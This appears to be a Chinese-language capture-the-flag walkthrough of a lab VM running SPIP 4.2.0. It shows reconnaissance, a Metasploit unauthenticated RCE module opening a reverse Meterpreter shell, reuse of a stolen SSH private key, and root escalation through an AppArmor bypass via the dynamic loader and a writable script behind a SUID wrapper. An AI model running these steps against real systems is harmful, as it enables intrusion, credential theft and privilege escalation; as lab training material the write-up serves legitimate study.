# 信息收集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-28 00:15 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:7A:D5:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

# 漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://192.168.21.8                                 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
images               (Status: 301) [Size: 313] [--> http://192.168.21.8/images/]                                        
index.html           (Status: 200) [Size: 8686]
server-status        (Status: 403) [Size: 277]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

指纹识别

```
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.21.8
http://192.168.21.8 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.21.8], Title[Publisher's Pulse: SPIP Insights & Tips]
```

看一下关键路径

```
┌──(kali㉿kali)-[~]
└─$ curl -I http://192.168.21.8/ecrire/
HTTP/1.1 404 Not Found
Date: Thu, 28 May 2026 04:22:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1                                                        
┌──(kali㉿kali)-[~]
└─$ curl -I http://192.168.21.8/spip/  
HTTP/1.1 200 OK
Date: Thu, 28 May 2026 04:23:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Cookie,Accept-Encoding
Composed-By: SPIP 4.2.0 @ www.spip.net + http://192.168.21.8/spip/local/config.txt
Link: <http://192.168.21.8/spip/local/cache-css/8f0689910ff824a027ce8f76070bcfad.css?1779942187>;rel="preload";as="style";
X-Spip-Cache: 86400
Last-Modified: Thu, 28 May 2026 04:23:07 GMT
Connection: close
Content-Type: text/html; charset=utf-8                                                          
┌──(kali㉿kali)-[~]
└─$ curl -I http://192.168.21.8/backend
HTTP/1.1 404 Not Found
Date: Thu, 28 May 2026 04:23:12 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=iso-8859-1
```

spip 4.2.0，寻找一下漏洞

```
msf exploit(multi/http/spip_bigup_unauth_rce) > run
[*] Started reverse TCP handler on 192.168.21.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNOtIY6q36fgXbnqMlPG...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (45739 bytes) to 192.168.21.8
[*] Meterpreter session 1 opened (192.168.21.7:4444 -> 192.168.21.8:53458) at 2026-05-28 00:43:56 -0400

meterpreter > shell
Process 33 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
//发现密钥
www-data@41c976e507f8:/home/think/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
//利用密钥登录ssh
┌──(kali㉿kali)-[~]
└─$ ssh think@192.168.21.8 -i id_rsa
The authenticity of host '192.168.21.8 (192.168.21.8)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.8' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 28 May 2026 04:49:20 AM UTC

  System load:                      0.16
  Usage of /:                       74.7% of 9.75GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        200
  Users logged in:                  0
  IPv4 address for br-72fdb218889f: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for enp0s3:          192.168.21.8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Mar 29 13:22:11 2024 from 192.168.109.1
think@publisher:~$ 
//sudo需要密码
think@publisher:~$ sudo -l
[sudo] password for think: 
Sorry, try again.
[sudo] password for think: 
Sorry, try again.
[sudo] password for think: 
sudo: 3 incorrect password attempts
//发现一个可疑的：run_container
think@publisher:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/sbin/run_container
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
think@publisher:~$ ls -l /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
//这个SUID程序本身只是一个wrapper实际调用的是：/opt/run_container.sh
think@publisher:~$ /usr/sbin/run_container
/bin/bash: /opt/run_container.sh: Permission denied
//文件可写
think@publisher:~$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh 
//但是没成功
think@publisher:~$ echo -e '#!/bin/bash\n/bin/bash' > /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
//原来shell不是bash是ash
think@publisher:~$ env
SHELL=/usr/sbin/ash
PWD=/home/think
LOGNAME=think
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/think
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.21.7 49334 192.168.21.8 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=think
SHLVL=1
XDG_SESSION_ID=7
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.21.7 49334 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
//ld-linux-x86-64.so.2是glibc的动态链接器。正常运行bash，内核是会自己找的。这里手动执行/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash，本质是让动态链接器去加载bash。因为AppArmor限制的是/usr/sbin/ash，而profile没有正确限制ld-linux，所以通过它启动的bash没继承原来的限制，就能访问 /opt 了。
think@publisher:~$ ls /lib/x86_64-linux-gnu/ | grep 'x86-64'
ld-linux-x86-64.so.2
libpyldb-util.cpython-38-x86-64-linux-gnu.so.2
libpyldb-util.cpython-38-x86-64-linux-gnu.so.2.4.4
libpytalloc-util.cpython-38-x86-64-linux-gnu.so.2
libpytalloc-util.cpython-38-x86-64-linux-gnu.so.2.3.3
libsamba-policy.cpython-38-x86-64-linux-gnu.so.0
libsamba-policy.cpython-38-x86-64-linux-gnu.so.0.0.1
think@publisher:~$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
think@publisher:~$ echo $SHELL
/usr/sbin/ash
think@publisher:~$ echo "bash -p" >> /opt/run_container.sh 
think@publisher:~$ /usr/sbin/run_container 
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up Less than a second

Enter the ID of the container or leave blank to create a new one: /opt/run_container.sh
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    4) Create Container
2) Stop Container     5) Quit
3) Restart Container
Choose an action for a container: 1
Error response from daemon: No such container: opt/run_container.sh
Error: failed to start containers: /opt/run_container.sh
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```
